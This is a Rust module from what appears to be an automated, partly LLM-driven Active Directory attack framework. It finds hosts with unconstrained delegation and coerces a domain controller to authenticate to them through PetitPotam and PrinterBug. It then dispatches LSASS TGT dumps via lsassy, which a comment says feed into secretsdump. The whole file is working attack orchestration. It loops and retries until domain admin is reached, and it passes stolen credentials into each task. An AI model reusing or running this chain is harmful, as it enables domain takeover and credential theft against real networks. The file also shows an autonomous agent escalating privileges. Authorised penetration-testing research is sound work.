//! auto_unconstrained_exploitation -- coerce-and-dump for unconstrained delegation.
//!
//! When a machine account with unconstrained delegation is discovered (e.g.
//! `DC02$`), this automation orchestrates the full attack chain:
//!
//!   1. **Coerce** a DC to authenticate to the unconstrained delegation host
//!      (PetitPotam / PrinterBug). The DC's TGT is cached in LSASS on that host.
//!   2. **Dump** cached TGTs from the host's LSASS memory via lsassy.
//!   3. **Chain** — result_processing's `auto_chain_s4u_secretsdump` picks up any
//!      `.ccache` ticket and dispatches secretsdump automatically.
//!
//! User accounts with unconstrained delegation (e.g. `sarah.connor`) are left to
//! the LLM-driven exploit path since we can't determine the target host.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tokio::time::Instant;
use tracing::{debug, info, warn};

use crate::dispatcher::Dispatcher;
use crate::state::DEDUP_COERCED_DCS;

/// Delay after coercion before dispatching the first TGT dump, giving the
/// coerced authentication time to complete and the TGT to land in LSASS.
const COERCE_TO_DUMP_DELAY: Duration = Duration::from_secs(15);

/// Maximum TGT dump attempts per vulnerability before giving up.
const MAX_DUMP_ATTEMPTS: u32 = 3;

/// Delay between successive dump retries for the same vuln.
const DUMP_RETRY_DELAY: Duration = Duration::from_secs(60);

// -----------------------------------------------------------------------
// Phase tracking (in-memory only — intentionally not persisted so restarts
// re-trigger the chain, since cached TGTs expire quickly).
// -----------------------------------------------------------------------

#[derive(Debug)]
struct PhaseState {
    coercion_dispatched_at: Option<Instant>,
    dump_attempts: u32,
    last_dump_at: Option<Instant>,
    completed: bool,
}

/// Monitors for unconstrained delegation vulns and orchestrates coerce → dump.
/// Interval: 20s. Wakes on delegation_notify and credential_access_notify.
pub async fn auto_unconstrained_exploitation(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let deleg_notify = dispatcher.delegation_notify.clone();
    let cred_notify = dispatcher.credential_access_notify.clone();
    let mut interval = tokio::time::interval(Duration::from_secs(20));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    let mut phases: HashMap<String, PhaseState> = HashMap::new();

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = deleg_notify.notified() => {},
            _ = cred_notify.notified() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let work: Vec<UnconstrainedWork> = {
            let state = dispatcher.state.read().await;

            if state.has_domain_admin {
                continue;
            }

            state
                .discovered_vulnerabilities
                .values()
                .filter_map(|vuln| {
                    if vuln.vuln_type.to_lowercase() != "unconstrained_delegation" {
                        return None;
                    }
                    if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                        return None;
                    }

                    let account_name = vuln
                        .details
                        .get("account_name")
                        .and_then(|v| v.as_str())?
                        .to_string();

                    let domain = vuln
                        .details
                        .get("domain")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string();

                    // Skip completed vulns
                    if phases.get(&vuln.vuln_id).is_some_and(|p| p.completed) {
                        return None;
                    }

                    // Only automate machine accounts — we can resolve hostname → IP.
                    // User accounts (sarah.connor) go through the LLM exploit path.
                    if !account_name.ends_with('$') {
                        return None;
                    }

                    // Resolve machine hostname → IP from discovered hosts.
                    // DC02$ → look for host with hostname starting with "dc02".
                    let hostname_prefix = account_name.trim_end_matches('$').to_lowercase();
                    let host_ip = state.hosts.iter().find_map(|h| {
                        let h_lower = h.hostname.to_lowercase();
                        if h_lower == hostname_prefix
                            || h_lower.starts_with(&format!("{hostname_prefix}."))
                        {
                            Some(h.ip.clone())
                        } else {
                            None
                        }
                    })?;

                    // Find a DC in the same domain — this is what we coerce FROM.
                    let dc_ip = state
                        .domain_controllers
                        .get(&domain.to_lowercase())
                        .cloned();

                    // Find any non-quarantined credential for this domain.
                    let credential = state
                        .credentials
                        .iter()
                        .find(|c| {
                            c.domain.to_lowercase() == domain.to_lowercase()
                                && !state.is_credential_quarantined(&c.username, &c.domain)
                        })
                        .cloned();

                    if credential.is_none() {
                        debug!(
                            vuln_id = %vuln.vuln_id,
                            "Unconstrained: no credential available yet"
                        );
                        return None;
                    }

                    // Determine action based on current phase.
                    let phase = phases.get(&vuln.vuln_id);

                    // If auto_coercion already coerced this DC, skip straight to dump.
                    let already_coerced = dc_ip
                        .as_ref()
                        .is_some_and(|ip| state.is_processed(DEDUP_COERCED_DCS, ip));

                    let action = match phase {
                        // No phase yet — dispatch coercion (or skip if already coerced).
                        None if already_coerced => Action::Dump,
                        None if dc_ip.is_some() => Action::Coerce,
                        None => {
                            debug!(
                                vuln_id = %vuln.vuln_id,
                                "Unconstrained: no DC found for coercion"
                            );
                            return None;
                        }

                        // Coercion dispatched, waiting for delay before dump.
                        Some(p) if p.coercion_dispatched_at.is_some() && p.dump_attempts == 0 => {
                            if p.coercion_dispatched_at.unwrap().elapsed() >= COERCE_TO_DUMP_DELAY {
                                Action::Dump
                            } else {
                                return None;
                            }
                        }

                        // Dump retry — previous attempt didn't yield TGTs.
                        Some(p)
                            if p.dump_attempts > 0
                                && p.dump_attempts < MAX_DUMP_ATTEMPTS
                                && p.last_dump_at
                                    .is_none_or(|t| t.elapsed() >= DUMP_RETRY_DELAY) =>
                        {
                            Action::Dump
                        }

                        _ => return None,
                    };

                    Some(UnconstrainedWork {
                        vuln_id: vuln.vuln_id.clone(),
                        account_name,
                        domain,
                        host_ip,
                        dc_ip,
                        credential,
                        action,
                    })
                })
                .collect()
        };

        for item in work {
            match item.action {
                Action::Coerce => {
                    let dc_ip = match &item.dc_ip {
                        Some(ip) => ip.clone(),
                        None => continue,
                    };

                    let cred = match &item.credential {
                        Some(c) => c,
                        None => continue,
                    };

                    // Coerce DC → unconstrained host. The DC's TGT is cached
                    // in the unconstrained host's LSASS.
                    let payload = json!({
                        "target_ip": dc_ip,
                        "listener_ip": item.host_ip,
                        "techniques": ["petitpotam", "printerbug"],
                        "credential": {
                            "username": cred.username,
                            "password": cred.password,
                            "domain": cred.domain,
                        },
                        "reason": "unconstrained_delegation_coercion",
                    });

                    match dispatcher
                        .throttled_submit("coercion", "coercion", payload, 8)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                vuln_id = %item.vuln_id,
                                account = %item.account_name,
                                dc = %dc_ip,
                                listener = %item.host_ip,
                                "Unconstrained delegation: coercion dispatched (DC → host)"
                            );
                            phases.insert(
                                item.vuln_id.clone(),
                                PhaseState {
                                    coercion_dispatched_at: Some(Instant::now()),
                                    dump_attempts: 0,
                                    last_dump_at: None,
                                    completed: false,
                                },
                            );
                        }
                        Ok(None) => {
                            debug!(vuln_id = %item.vuln_id, "Coercion deferred by throttler");
                        }
                        Err(e) => {
                            warn!(
                                err = %e,
                                vuln_id = %item.vuln_id,
                                "Failed to dispatch unconstrained coercion"
                            );
                        }
                    }
                }

                Action::Dump => {
                    let cred = match &item.credential {
                        Some(c) => c,
                        None => continue,
                    };

                    let payload = json!({
                        "technique": "unconstrained_tgt_dump",
                        "vuln_type": "unconstrained_delegation",
                        "vuln_id": item.vuln_id,
                        "target": item.host_ip,
                        "target_ip": item.host_ip,
                        "domain": item.domain,
                        "account_name": item.account_name,
                        "credential": {
                            "username": cred.username,
                            "password": cred.password,
                            "domain": cred.domain,
                        },
                    });

                    match dispatcher
                        .throttled_submit("exploit", "privesc", payload, 9)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            let phase = phases.entry(item.vuln_id.clone()).or_insert(PhaseState {
                                coercion_dispatched_at: None,
                                dump_attempts: 0,
                                last_dump_at: None,
                                completed: false,
                            });
                            phase.dump_attempts += 1;
                            phase.last_dump_at = Some(Instant::now());

                            info!(
                                task_id = %task_id,
                                vuln_id = %item.vuln_id,
                                attempt = phase.dump_attempts,
                                target = %item.host_ip,
                                "Unconstrained delegation: TGT dump dispatched"
                            );

                            if phase.dump_attempts >= MAX_DUMP_ATTEMPTS {
                                phase.completed = true;
                                debug!(
                                    vuln_id = %item.vuln_id,
                                    "Unconstrained delegation: max dump attempts reached"
                                );
                            }
                        }
                        Ok(None) => {
                            debug!(vuln_id = %item.vuln_id, "TGT dump deferred by throttler");
                        }
                        Err(e) => {
                            warn!(
                                err = %e,
                                vuln_id = %item.vuln_id,
                                "Failed to dispatch TGT dump"
                            );
                        }
                    }
                }
            }
        }
    }
}

#[derive(Debug)]
enum Action {
    Coerce,
    Dump,
}

struct UnconstrainedWork {
    vuln_id: String,
    account_name: String,
    domain: String,
    host_ip: String,
    dc_ip: Option<String>,
    credential: Option<ares_core::models::Credential>,
    action: Action,
}

#[cfg(test)]
mod tests {
    #[test]
    fn test_hostname_resolution_machine_account() {
        // DC02$ → "dc02"
        let account = "DC02$";
        let prefix = account.trim_end_matches('$').to_lowercase();
        assert_eq!(prefix, "dc02");

        // Should match "dc02.child.contoso.local"
        let hostname = "dc02.child.contoso.local";
        let h_lower = hostname.to_lowercase();
        assert!(h_lower == prefix || h_lower.starts_with(&format!("{prefix}.")));
    }

    #[test]
    fn test_hostname_resolution_short_name() {
        let account = "DC01$";
        let prefix = account.trim_end_matches('$').to_lowercase();
        assert_eq!(prefix, "dc01");

        // Should match "dc01"
        assert!("dc01" == prefix);
        // Should match "dc01.contoso.local"
        assert!("dc01.contoso.local".starts_with(&format!("{prefix}.")));
        // Should NOT match "dc011.contoso.local"
        assert!(!"dc011.contoso.local".starts_with(&format!("{prefix}.")));
    }
}
